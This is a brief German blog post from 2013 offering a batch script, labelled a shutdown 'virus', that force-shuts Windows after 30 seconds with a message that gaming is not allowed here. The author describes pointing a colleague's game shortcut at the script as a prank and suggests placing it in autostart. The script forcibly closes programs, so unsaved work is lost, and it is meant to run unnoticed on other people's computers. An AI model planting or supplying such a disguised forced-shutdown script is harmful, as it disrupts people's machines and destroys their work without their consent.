.. date: 2013/06/16 18:06
.. type: text

Shutdown-"Virus" für Windows
============================

Beschreibung
------------

Dieses kurze Script ruft eine Funktion von Windows auf, die den Computer herunterfährt.

Mit diesen Parametern wird noch 30 Sekunden gewartet, dann aber alles sofort beendet.

Ich habe es benutzt um Kollegen auf der Arbeit zu "trollen" und eine Verknüpgung eines Spiels auf diese Batch-Datei verlinkt. Denn auf der Arbeit wird schliesslich nicht gespielt.

FTW auch als Autostart einzurichten. :D

Source Code
-----------

.. code-block:: batch

    @echo off

    shutdown -s -t 30 -f -c "Hier wird nicht gespielt."

    exit /B
